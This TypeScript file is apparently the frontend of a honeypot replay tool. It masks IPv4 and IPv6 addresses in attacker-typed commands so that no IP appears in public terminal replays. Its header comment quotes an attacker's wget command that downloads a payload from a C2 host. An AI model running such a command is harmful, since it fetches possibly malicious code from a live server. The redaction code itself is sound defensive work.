/**
 * Mask IPv4/IPv6 literals inside attacker-controlled text (command input,
 * download URLs) before it is rendered. Honeywatch's privacy posture is that no
 * IP is ever shown in the public terminal replay -- the attacker's own src_ip
 * is already stripped by the API, but C2 / payload hosts appear *inside* what
 * the attacker typed (e.g. `wget http://34.11.136.102/meow`), so they must be
 * blotted here on the frontend.
 *
 * Output is a segment list so the renderer can wrap each blot in a styled span
 * (no v-html / no XSS surface). Always applied -- the redaction policy is fixed
 * to "always blot".
 */

export interface RedactSegment {
  text: string
  redacted: boolean
}

export interface RedactResult {
  segments: RedactSegment[]
  /** Redacted form as a single string (blots replaced by `token`). */
  text: string
  /** Number of IP literals masked. */
  count: number
}

export const IP_BLOT = '‹ip›'

// IPv4: four dot-separated octets 0-255, on word boundaries.
const IPV4 = String.raw`(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)`

// IPv6: the canonical 9-branch matcher. Every branch is either 8 full groups or
// contains a `::` run, so decimal clock strings like "13:41:49" (3 groups, no
// `::`) can never match -- avoiding the classic false positive.
const IPV6_CORE = [
  String.raw`(?:[0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,7}:`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,6}:[0-9A-Fa-f]{1,4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,5}(?::[0-9A-Fa-f]{1,4}){1,2}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,4}(?::[0-9A-Fa-f]{1,4}){1,3}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,3}(?::[0-9A-Fa-f]{1,4}){1,4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,2}(?::[0-9A-Fa-f]{1,4}){1,5}`,
  String.raw`[0-9A-Fa-f]{1,4}:(?::[0-9A-Fa-f]{1,4}){1,6}`,
  String.raw`:(?:(?::[0-9A-Fa-f]{1,4}){1,7}|:)`,
].join('|')

// IPv6 must be bounded by a non hex/colon char so we never grab a partial token.
const IPV6 = String.raw`(?<![0-9A-Fa-f:])(?:${IPV6_CORE})(?:%[0-9A-Za-z]+)?(?![0-9A-Fa-f:])`

const IP_SOURCE = `(?:${IPV6})|(?:\\b${IPV4}\\b)`

export function redactIps(text: string, token: string = IP_BLOT): RedactResult {
  const segments: RedactSegment[] = []
  const re = new RegExp(IP_SOURCE, 'g')
  let last = 0
  let count = 0

  let m: RegExpExecArray | null
  while ((m = re.exec(text)) !== null) {
    if (m[0].length === 0) {
      // Defensive: a zero-width match would loop forever; advance past it.
      re.lastIndex++
      continue
    }
    if (m.index > last) segments.push({ text: text.slice(last, m.index), redacted: false })
    segments.push({ text: token, redacted: true })
    count++
    last = m.index + m[0].length
  }
  if (last < text.length) segments.push({ text: text.slice(last), redacted: false })

  return { segments, text: segments.map((s) => s.text).join(''), count }
}
